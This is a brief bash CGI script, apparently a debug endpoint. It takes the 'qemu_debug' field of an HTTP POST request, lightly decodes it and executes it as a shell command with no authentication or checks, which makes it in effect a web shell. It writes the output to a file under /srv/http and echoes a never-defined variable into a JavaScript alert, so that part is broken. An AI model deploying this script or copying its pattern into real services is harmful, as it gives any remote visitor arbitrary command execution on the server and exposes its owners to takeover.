#!/bin/bash

echo "Content-type: text/html"
echo ""

read POST_STRING

cmd=`echo "$POST_STRING" | sed -n 's/^.*qemu_debug=\([^&]*\).*$/\1/p' | sed "s/+/ /g; s/%2F/\//g; s/%24/$/g; s/%28/(/g; s/%29/)/g"`

$cmd > /srv/http/cmdout
echo "<script> alert(\"$output\");</script>"
